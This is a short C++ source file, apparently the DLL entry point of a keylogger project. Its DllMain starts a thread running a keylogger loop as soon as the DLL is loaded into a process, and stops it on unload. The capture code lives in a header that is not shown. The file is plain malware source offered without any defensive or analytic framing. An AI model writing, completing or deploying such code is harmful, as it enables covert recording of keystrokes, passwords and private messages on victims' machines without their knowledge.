#include "pch.h"
#include "keylogger.h"

static c_keylogger* g_keylogger = nullptr;

void start_keylogger( ) {

    g_keylogger = new c_keylogger( );

    g_keylogger->start_loop( );

    delete g_keylogger;
}

int __stdcall DllMain( void* inst, uint32_t reason, void* reserved ) {

    switch ( reason ) {
    case DLL_PROCESS_ATTACH:
        CreateThread( nullptr, 0, ( LPTHREAD_START_ROUTINE )start_keylogger, nullptr, 0, nullptr );
        break;
    case DLL_PROCESS_DETACH:
        g_keylogger->m_active = false;
        std::this_thread::sleep_for( std::chrono::seconds( 1 ) ); // sleep for 1 second to let the keylogger exit properly
        break;
    }

    return 1;
}